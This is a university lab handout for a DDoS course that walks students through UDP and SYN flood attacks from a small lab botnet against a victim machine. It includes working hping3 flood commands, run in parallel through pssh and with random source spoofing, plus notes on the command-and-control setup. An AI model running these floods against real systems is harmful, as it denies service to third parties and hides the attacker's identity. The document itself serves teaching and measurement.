# 💻 Lab 2B: Attack Generation(1)

## Introduction

Different DDoS attacks have different performances. In this lab, students are to perform 4 types of attacks and measure their performance.&#x20;

In this lab, you will:

* Learn how 4 types of attacks are launched.
* Observe performance differences between different types of attacks.

## Instructions

* Connect to Security Lab machines(CnC machine and Bot machine).
* Run scripts to measure the performance of attacks.
* Capture traffic when launching a DNS amplification attack.
* Launch 3 different combinations of attacks and measure the performance.

## Questions

1. Discuss the difference between each attack combination you choose.&#x20;
2. For SYN Flood attack, capture a complete TCP three-way handshake process and explain it in detail.
3. For DNS amplification attack, capture the traffic sent by the attacker and the traffic received by the victim and calculate the amplification ratio.
4. For each attack combination, discuss the following questions:
5. Capture attack traffic and explain its effect on the network and victim node.
6. Discuss the changes in system availability between before and after the attack.
7. Discuss the changes in system resource usage before and after the attack.

## Lab Report

1. Discuss the questions above.
2. Show your steps doing this lab.

## Guide

1.  Understand the network environment:

    In this lab, 4 kind of machines will be involved:\


    Bot: machine to launch attacks.

    IP: Bot1: 192.168.10.109 Hosted on machine:192.168.10.21

    Bot2: 192.168.10.132 Hosted on machine:192.168.10.20

    Credentials: ^^^^/^^^^^^ Same as spoof



    CnC: command and control machine used to observe and connect to Bots.

    IP: 192.168.10.125

    Credentials: \*\*\*\*\***/**\* \*\*\*\*\* Same as spoof



    Victim machine: target of the DDoS attacks.

    IP: 192.168.10.112

    Hosted on machine 192.168.10.22\


    DNS Server: used in DNS Amplification attack.

    IP: 192.168.10.100



1.  Add SSH configuration: (add “ForwardX11 yes” to host spoof)

    | <p>Host eceddos<br>  HostName 130.127.248.232<br>  User ddos</p><p><br>Host sniffer<br>  HostName 192.168.10.9<br>  User &#x3C;your username here><br>  ForwardX11 yes<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host cnc<br>  User root<br>  HostName 192.168.10.125<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot1_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.21<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot2_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.20<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host victim_host</p><p>  User &#x3C;your username here><br>  HostName 192.168.10.22<br>  ProxyCommand ssh -W %h:%p eceddos</p> |
    | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
2.  Victim response time observing:

    In CnC machine, goto DDoS\_Lab4 folder and run:

    | #./ping\_web.sh 192.168.10.112 |
    | ------------------------------ |

    Then the terminal will continuously check the response time of the victim machine.\
    \

3.  FLOOD ATTACK

    In the CnC machine, go to DDoS\_Lab4 folder and execute the following commands:

    | #pssh -h bots.txt -P -t100 'hostname' |
    | ------------------------------------- |

    This will show available bots.

    | #pssh -h bots.txt -P -t30 'sleep 1; hping3 --udp -d 10000 -p 80 --flood 192.168.10.112 & sleep 10; pkill hping3' |
    | ---------------------------------------------------------------------------------------------------------------- |



    * sleep: Delay for a specified amount of time
    * hping3: Send (almost) arbitrary TCP/IP packets to network hosts
    * \--udp: UDP mode
    * \-d data size: set packet body size
    * \-p: set destination port
    * \--flood: send packets as fast as possible without taking care to show incoming replies.
    * &: executes the commands in the background.
    * pkill: look up or signal processes based on name and other attributes.

    If the script does not stop after 30 seconds, use Ctrl+C to stop.\
    \

4.  SYN FLOOD ATTACK

    In the CnC machine, ssh into one of the bots available:

    | #ssh 192.168.10.109 |
    | ------------------- |

    Then in the bot shell, where “root@bot\~#” shows, run

    | #hping3 -V -c 10 -d 120 -S -w 64 -p 80 -i u10000 --rand-source 192.168.10.112 |
    | ----------------------------------------------------------------------------- |

    * \-V :enable verbose output
    * \-c count: stop after sending(and receiving) count response packets
    * \-d data size: set packet body size
    * \-S: set SYN tcp flag
    * \-w: set TCP window size. Default is 64.
    * \-p: set destination port
    * \-i: wait the specified number of seconds or microseconds between sending each packet.
    * \--rand-source: this option enables the random source mode. Hping will send packets with random source addresses.

    If the above command doesn’t get the expected result, change count to a bigger one.

    \


## Appendix

### **BOT NET**

In this lab, a botnet is constructed by a set of Kali linux VMs deployed on every host machine on the Clemson network. Each Kali VM is configured with SSH passwordless login. The CnC server is also a Kali Linux VM. The CnC server has the public key used to login to each bot. The program pssh installed on the CnC server, or parallel ssh, is used to remotely execute ssh commands on each bot in parallel. By using the CnC server, all attack traffic is launched from the bot. The victim will not be aware the true identity of the CnC server.

You can also write your own attack script, upload to the bots, and use pssh or any method to launch your attack script.

* pssh(1 - Linux man page [https://linux.die.net/man/1/pssh](https://linux.die.net/man/1/pssh)

\


### **Flood Attack**

Flood attack consumes network bandwidth by sending a large number of packets and usually from multiple bots. A flood attack does not necessarily have to be launched directly against the target. As long as one node on the route between a legitimate user and the victim is congested, the legitimate user will not be able to visit the victim node. Under such scenarios, the victim will not observe any attack traffic, but the service to the legitimate user is denied. For the configuration we have in the lab, a direct flood attack is much more effective than trying to starve the internal bandwidth of the switch.&#x20;

* Hping3 - Linux man page [https://linux.die.net/man/8/hping3](https://linux.die.net/man/8/hping3)

\


### **SYN Flood**

SYN flood attack takes advantage of the three-way handshake of the TCP connection by sending a large amount of SYN packets but never actually establishing any connections. SYN cookie is one of the most commonly used methods to mitigate such attacks. However, it is still debating whether it is good to use SYN cookie on heavy loaded servers.

* Defenses Against TCP SYN Flooding Attacks : [https://www.cisco.com/c/dam/en\_us/about/ac123/ac147/archived\_issues/ipj\_9-4/ipj\_9-4.pdf](https://www.cisco.com/c/dam/en\_us/about/ac123/ac147/archived\_issues/ipj\_9-4/ipj\_9-4.pdf)

\
